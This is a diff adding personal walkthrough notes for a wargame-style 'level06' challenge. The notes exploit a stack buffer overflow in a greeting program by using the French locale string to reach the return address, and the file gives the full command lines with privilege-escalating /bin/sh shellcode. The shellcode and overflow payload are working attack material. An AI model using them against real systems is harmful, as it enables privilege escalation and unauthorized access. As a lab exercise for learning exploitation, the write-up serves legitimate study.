@@ -1,0 +1,27 @@
+1.) Need to write 76 bytes, combining first name and last name buffers to get to eip
+    - Total bytes for name is 72 bytes.
+    - Destination buffer that needs to be 76, starts with some greeting text, by default "Hi ",
+      that's 4 bytes counting null terminator.
+    - We need 4 more bytes, because we need to write 76 to reach return address, then 4 more to overwrite return address
+
+2.) Set environment variable to french since the intial greeting string gives us the extra 4 bytes needed.
+    - set env LANG=fr
+
+3.) Remove the gdb environment stuff so that our environments match outside gdb (for correct stack positions)
+    - unset env COLUMNS
+    - unset env LINES
+
+3.) In french we get "Bienvenue " which is 10 bytes we get for free, since null byte is replaced.  76 - 10 = 66 bytes, then our jump
+
+4.) Python test code:
+    - r `python -c "print('A'*40)"` `python -c "print('A'*26 + 'B'*4)"`
+
+5.) Now get the starting location of our buffer in the greetuser function
+    - p ($ebp - 0x48) = 0xbffffb80
+    - We add 10 because the first 10 bytes are the initial greeting = 0xbffffb8a
+
+5.) Now to fit our shell code into it that will escelate privliges and spawn a shell:
+    - r `python -c "print('\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\xbe\x2f\x2f\x73\x68\xc1\xee\x08\x56\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80')"` `python -c "print('A'*26 + '\xbf\xff\xfb\x8a'[::-1])"`
+
+6.) Run it and then get level 7's password!:
+    - LANG=fr /levels/level06 `python -c "print('\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\xbe\x2f\x2f\x73\x68\xc1\xee\x08\x56\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80')"` `python -c "print('A'*26 + '\xbf\xff\xfb\x8a'[::-1])"`
